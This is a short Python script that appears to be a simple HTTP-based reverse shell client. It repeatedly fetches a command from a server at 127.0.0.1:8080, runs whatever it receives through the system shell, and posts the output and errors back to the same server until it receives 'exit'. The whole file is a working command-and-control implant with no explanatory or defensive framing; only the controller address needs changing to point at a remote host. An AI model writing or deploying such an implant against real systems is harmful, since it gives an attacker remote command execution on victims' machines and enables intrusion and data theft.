#!/usr/bin/env python 

import subprocess
import requests 
import time 

def main():
    #
    while(True):
        #
        R = requests.get("http://127.0.0.1:8080")
        #
        command = R.text 
        #
        if('exit' in command):
            #
            break 
            #
        else:
            #
            cmd = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            #
            postResponse = requests.post(url="http://127.0.0.1:8080",data=cmd.stdout.read())
            #
            postReponse = requests.post(url="http://127.0.0.1:8080", data=cmd.stderr.read())
            #
        time.sleep(3)

if(__name__ == '__main__'):
    #
    main()